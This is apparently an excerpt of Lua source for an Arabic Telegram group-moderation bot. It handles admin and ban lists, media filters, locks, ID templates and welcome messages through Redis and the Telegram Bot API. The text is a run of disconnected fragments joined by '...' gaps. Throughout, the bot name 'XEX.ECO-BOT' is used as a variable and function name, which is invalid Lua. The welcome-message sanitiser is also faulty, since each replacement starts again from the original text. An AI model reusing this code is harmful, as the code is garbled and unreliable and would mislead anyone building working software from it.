if DevALS:get(XEX.ECO-BOT..'ALS:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevALS:sadd(XEX.ECO-BOT.."ALS:cleanernum"..msg.chat_id_, msg.id_) else DevALS:sadd(XEX.ECO-BOT.."ALS:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevALS:sadd(XEX.ECO-BOT.."ALS:cleanermusic"..msg.chat_id_, msg.id_) else DevALS:sadd(XEX.ECO-BOT.."ALS:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevALS:sismember(XEX.ECO-BOT.."ALS:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_)
text = "☆︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(XEX.ECO-BOT..ALS)
text = "☆︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_)
text = "☆︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_)
text = "☆︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_)
text = "☆︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_)
text = "☆︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_)
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_)
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_)
text = "☆︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_)
...
local List = DevALS:smembers(XEX.ECO-BOT..'User:Donky:'..msg.chat_id_)
...
local List = DevALS:hkeys(XEX.ECO-BOT..'ALS:Filters:'..msg.chat_id_)
text = "☆︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:ALSSudo:')
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:SecondSudo:')
...
local BanAll = DevALS:smembers(XEX.ECO-BOT..'ALS:BanAll:')
local MuteAll = DevALS:smembers(XEX.ECO-BOT..'ALS:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:SudoBot:')
text = "☆︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevALS:get(XEX.ECO-BOT..'ALS:Sudos'..v) 
local username = DevALS:get(XEX.ECO-BOT..'Save:UserName'..v)
if username then
...
DevALS:sadd(XEX.ECO-BOT.."ALS:ALSConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
DevALS:sadd(XEX.ECO-BOT.."ALS:FilterSteckr"..msg.chat_id_,idsticker)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevALS:sadd(XEX.ECO-BOT.."ALS:FilterPhoto"..msg.chat_id_,photo)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevALS:sadd(XEX.ECO-BOT.."ALS:FilterAnimation"..msg.chat_id_,idanimation)
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevALS:srem(XEX.ECO-BOT.."ALS:FilterSteckr"..msg.chat_id_,idsticker)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevALS:srem(XEX.ECO-BOT.."ALS:FilterPhoto"..msg.chat_id_,photo)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevALS:srem(XEX.ECO-BOT.."ALS:FilterAnimation"..msg.chat_id_,idanimation)
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Thwel:ALS'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل تحويل الصيغ'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Thwel:ALS'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevALS:get(XEX.ECO-BOT..'ALS:Thwel:ALS'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevALS:sismember(XEX.ECO-BOT..'ALS:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n☆︙عدد الكروبات ↫ '..(DevALS:get(XEX.ECO-BOT..'ALS:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevALS:sismember(XEX.ECO-BOT..'ALS:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n☆︙عدد الكروبات ↫ '..(DevALS:get(XEX.ECO-BOT..'ALS:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevALS:sismember(XEX.ECO-BOT..'ALS:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n☆︙عدد الكروبات ↫ '..(DevALS:get(XEX.ECO-BOT..'ALS:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الحظر العام ↫ '..banall..'\n☆︙الكتم العام ↫ '..muteall..'\n☆︙الحظر ↫ '..banned..'\n☆︙الكتم ↫ '..muted..'\n☆︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(XEX.ECO-BOT..'ALS:BanAll:',result.sender_user_id_) DevALS:srem(XEX.ECO-BOT..'ALS:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,user) DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,user) DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,user) DevALS:srem(XEX.ECO-BOT..'ALS:BanAll:',user) DevALS:srem(XEX.ECO-BOT..'ALS:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,user) DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,user) DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,result.id_) DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,result.id_) DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,result.id_) DevALS:srem(XEX.ECO-BOT..'ALS:BanAll:',result.id_) DevALS:srem(XEX.ECO-BOT..'ALS:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_,result.id_) DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_,result.id_) DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevALS:set(XEX.ECO-BOT.."ALS:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevALS:set("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.sender_user_id_,'XEX.ECO-BOTTeam')
return "XEX.ECO-BOTTeam"
end
if text and DevALS:get("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevALS:del("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.sender_user_id_)
return false
end
DevALS:del("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevALS:set(XEX.ECO-BOT.."ALS:AllIds:Text",text)
return false
end
...
DevALS:del(XEX.ECO-BOT.."ALS:AllIds:Text")
end
end
--     Source XEX.ECO-BOT     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙رجائا اتبع التعليمات للتعيين \n☆︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉', 1, 'md')
DevALS:set("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.chat_id_..msg.sender_user_id_,'XEX.ECO-BOTTeam')
return "XEX.ECO-BOTTeam"
end
if text and Manager(msg) and DevALS:get("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevALS:del("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.chat_id_..msg.sender_user_id_)
return false
end
DevALS:del("XEX.ECO-BOT:New:id:"..XEX.ECO-BOT..msg.chat_id_..msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ الكليشه الجديده', 1, 'md')
DevALS:set(XEX.ECO-BOT.."ALS:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف كليشة الايدي")  
DevALS:del(XEX.ECO-BOT.."ALS:GpIds:Text"..msg.chat_id_)
end
end
--     Source XEX.ECO-BOT     --
if msg.reply_to_message_id_ ~= 0 then
...
function XEX.ECO-BOTTeam(extra,ALS,success)
...
local msgsday = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..XEX.ECO-BOT..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevALS:get(XEX.ECO-BOT..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevALS:get(XEX.ECO-BOT..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Id'..msg.chat_id_) then 
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Id:Photo'..msg.chat_id_) then 
if DevALS:get(XEX.ECO-BOT.."ALS:AllIds:Text") then
newpicid = DevALS:get(XEX.ECO-BOT.."ALS:AllIds:Text")
...
if not DevALS:get(XEX.ECO-BOT.."ALS:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ALS.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevALS:get(XEX.ECO-BOT.."ALS:GpIds:Text"..msg.chat_id_)
...
if DevALS:get(XEX.ECO-BOT.."ALS:AllIds:Text") then
newallid = DevALS:get(XEX.ECO-BOT.."ALS:AllIds:Text")
...
if DevALS:get(XEX.ECO-BOT.."ALS:AllIds:Text") then
notpicid = DevALS:get(XEX.ECO-BOT.."ALS:AllIds:Text")
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التعديل")  
DevALS:set(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل البوتات بالطرد")  
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_,"kick")  
end
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevALS:set(XEX.ECO-BOT.."ALS:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التثبيت")  
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Pin'..msg.chat_id_,true)
DevALS:sadd(XEX.ECO-BOT.."ALS:Lock:Pinpin",msg.chat_id_) 
else
...
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Id:Photo'..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الايدي بالصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Id'..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الايدي بالتاكيد معطل ', 1, 'md')
else
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الايدي بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source XEX.ECO-BOT     --
...
DevALS:setex(XEX.ECO-BOT.."ALS:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevALS:get(XEX.ECO-BOT.."ALS:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevALS:set(XEX.ECO-BOT.."ALS:Groups:Links"..msg.chat_id_,LinkGroup) 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الترحيب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT.."ALS:Lock:Welcome"..msg.chat_id_)
end
if DevALS:get(XEX.ECO-BOT..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevALS:del(XEX.ECO-BOT..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevALS:set(XEX.ECO-BOT..'ALS:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevALS:set(XEX.ECO-BOT..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف الترحيب")  
DevALS:del(XEX.ECO-BOT..'ALS:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevALS:get(XEX.ECO-BOT..'ALS:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_ALS(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء حفظ الوصف", 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevALS:del(XEX.ECO-BOT..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
